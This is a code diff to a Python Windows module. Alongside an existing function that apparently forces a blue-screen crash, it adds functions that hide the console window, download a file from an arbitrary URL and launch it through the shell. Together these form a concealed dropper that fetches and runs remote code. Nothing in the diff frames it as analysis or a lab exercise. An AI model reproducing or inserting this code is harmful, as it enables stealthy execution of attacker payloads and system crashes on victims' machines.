@@ -10,6 +10,7 @@ from ctypes import c_uint
 from ctypes import c_ulong
 from ctypes import POINTER
 from ctypes import byref
+import urllib.request
 
 class objects:
     def getAllUnifiedObjectsAndDelete():
@@ -117,3 +118,24 @@ def MakeBSOD():
         c_uint(6), 
         byref(c_uint())
     )
+
+def HideConsole():
+    kernel32 = ctypes.WinDLL("kernel32")
+    hWnd = kernel32.GetConsoleWindow()
+    if hWnd:
+        user32 = ctypes.WinDLL("user32")
+        user32.ShowWindow(hWnd, 0)
+
+
+def DownloadFile(url):
+    downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
+    file_name = url.split('/')[-1]
+    file_path = os.path.join(downloads_folder, file_name)
+    urllib.request.urlretrieve(url, file_path)
+    return file_path
+
+def StartProcess(file_path):
+    if os.path.isfile(file_path):
+        subprocess.Popen(['start', file_path], shell=True)
+    else:
+        subprocess.Popen(['start', '', file_path], shell=True)
